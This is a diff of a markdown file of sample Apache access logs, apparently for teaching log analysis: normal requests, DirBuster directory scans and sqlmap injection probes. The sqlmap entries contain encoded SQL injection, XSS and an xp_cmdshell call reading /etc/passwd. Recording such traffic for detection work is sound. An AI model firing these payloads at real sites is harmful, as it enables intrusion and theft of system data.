@@ -1,5 +1,5 @@
-## apache2 - normal(ish) GET requests - /var/log/apache2/access.log
-
+# apache2 - normal(ish) GET requests - /var/log/apache2/access.log
+```bash
 192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://192.168.56.6/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 192.168.56.3 - - [05/Aug/2019:14:32:48 -0400] "GET /favicon.ico HTTP/1.1" 404 503 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
@@ -7,14 +7,11 @@
 192.168.56.3 - - [05/Aug/2019:14:32:55 -0400] "GET /wp-login.php HTTP/1.1" 200 111993 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 192.168.56.3 - - [05/Aug/2019:14:33:28 -0400] "GET /wp-content/images/other/tokyoneon.jpoeg HTTP/1.1" 404 532 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 192.168.56.3 - - [05/Aug/2019:14:33:31 -0400] "GET /wp-content/images/other/tokyoneon.jpeg HTTP/1.1" 200 18264 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+```
 
-
-
-
-
-## apache2 - dirbuster attack - /var/log/apache2/access.log
+# apache2 - dirbuster attack - /var/log/apache2/access.log
 ## uses "dirbuster" user-agent by default
-
+```bash
 192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~uucp/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
 192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~operator.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
 192.168.56.3 - - [05/Aug/2019:14:37:54 -0400] "HEAD /~nscd.php HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
@@ -61,14 +58,11 @@
 192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /icons/~adm.txt HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
 192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~nscd/ HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
 192.168.56.3 - - [05/Aug/2019:14:37:55 -0400] "HEAD /~mailnull.key HTTP/1.1" 404 140 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"
+```
 
-
-
-
-
-## apache2 - sqlmap (injection) - /var/log/apache2/access.log
+# apache2 - sqlmap (injection) - /var/log/apache2/access.log
 ## uses "SQLmap" as user-agent by default
-
+```bash
 192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
 192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1&lPfi=4168%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
 192.168.56.3 - - [05/Aug/2019:14:45:04 -0400] "GET /index.php?id=1 HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
@@ -97,3 +91,4 @@
 192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20Tulp HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
 192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%29%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27EmsB%27%3D%27EmsB HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
 192.168.56.3 - - [05/Aug/2019:14:45:05 -0400] "GET /index.php?id=1%27%20AND%20%28SELECT%209800%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6271%2C%28SELECT%20%28ELT%289800%3D9800%2C1%29%29%29%2C0x7176767871%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27nubz%27%3D%27nubz HTTP/1.1" 200 1201 "-" "sqlmap/1.3.7#stable (http://sqlmap.org)"
+```
